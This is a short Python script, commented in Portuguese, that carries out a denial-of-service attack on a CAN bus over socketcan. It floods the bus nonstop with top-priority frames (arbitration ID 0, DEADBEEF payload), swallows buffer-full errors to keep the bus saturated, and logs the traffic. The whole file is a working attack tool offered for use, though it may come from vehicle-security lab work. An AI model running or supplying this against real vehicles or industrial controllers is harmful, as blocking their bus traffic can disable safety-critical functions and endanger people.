import can
import time
import datetime
import logging

# Configuração do logging
log_filename = f"dos-attack-robust-{time.time()}.log"
logging.basicConfig(filename=log_filename, level=logging.INFO, format='%(message)s')

def create_log_line(msg):
    payload = "".join([f"{byte:02X}" for byte in msg.data])
    logging.info(f'({msg.timestamp}) {msg.channel} {hex(msg.arbitration_id)}#{payload}')

try:
    bus = can.interface.Bus(channel='can0', bustype='socketcan')
    print("Interface can0 conectada. Iniciando ataque de DoS robusto...")
    print(f"Log será salvo em: {log_filename}")
    print("Pressione Ctrl+C para parar.")

    message = can.Message(
        arbitration_id=0,
        data=[0xDE, 0xAD, 0xBE, 0xEF, 0xDE, 0xAD, 0xBE, 0xEF],
        is_extended_id=False
    )

    while True:
        try:
            # Tenta enviar a mensagem
            bus.send(message)
        except can.CanError:
            # Se o buffer estiver cheio (CanError: [Errno 105] No buffer space available),
            # simplesmente ignora o erro e o loop continuará, tentando enviar novamente
            # na próxima iteração. Isso mantém a pressão máxima no barramento.
            pass

except KeyboardInterrupt:
    print("\nAtaque interrompido pelo usuário.")
except Exception as e:
    print(f"Ocorreu um erro inesperado: {e}")
finally:
    if 'bus' in locals() and bus is not None:
        bus.shutdown()
        print("Interface CAN desligada.")